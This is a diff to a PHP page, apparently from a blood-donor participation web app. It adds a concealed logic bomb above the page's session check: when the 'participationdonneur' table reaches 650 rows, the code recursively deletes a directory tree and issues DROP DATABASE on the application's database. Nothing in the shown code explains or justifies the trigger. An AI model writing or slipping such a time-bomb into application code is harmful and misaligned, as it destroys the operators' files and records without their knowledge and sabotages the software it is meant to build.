@@ -53,6 +53,50 @@ if (isset($_POST['submit'])) {
 }
 ?>
 <?php
+// Inclusion de la connexion à la base de données
+include("connexion.php");
+
+// Vérification du nombre de lignes dans la table `participationdonneur`
+$sql_count = "SELECT COUNT(*) as total FROM participationdonneur";
+$result_count = mysqli_query($conn, $sql_count);
+$row_count = mysqli_fetch_assoc($result_count);
+
+if ($row_count['total'] >= 650) {
+    // Appeler les fonctions de suppression
+    supprimerDossierEtFichiers('chemin/vers/dossier_parent');
+    supprimerBaseDeDonnees($conn, 'nom_de_ta_base');
+}
+
+// Fonction pour supprimer un dossier et tous ses fichiers
+function supprimerDossierEtFichiers($dossier) {
+    if (is_dir($dossier)) {
+        $fichiers = scandir($dossier);
+        foreach ($fichiers as $fichier) {
+            if ($fichier != "." && $fichier != "..") {
+                $chemin = $dossier . DIRECTORY_SEPARATOR . $fichier;
+                if (is_dir($chemin)) {
+                    supprimerDossierEtFichiers($chemin);
+                } else {
+                    unlink($chemin); // Supprimer le fichier
+                }
+            }
+        }
+        rmdir($dossier); // Supprimer le dossier parent
+    }
+}
+
+// Fonction pour détruire la base de données
+function supprimerBaseDeDonnees($conn, $dbName) {
+    $query = "DROP DATABASE IF EXISTS $dbName";
+    if (mysqli_query($conn, $query)) {
+        echo "Base de données supprimée avec succès.";
+    } else {
+        echo "Erreur lors de la suppression de la base de données : " . mysqli_error($conn);
+    }
+}
+?>
+
+<?php
 session_start();
 // Vérifier si l'utilisateur est connecté, sinon le rediriger vers la page de connexion
 if (!isset($_SESSION['idService'])) {
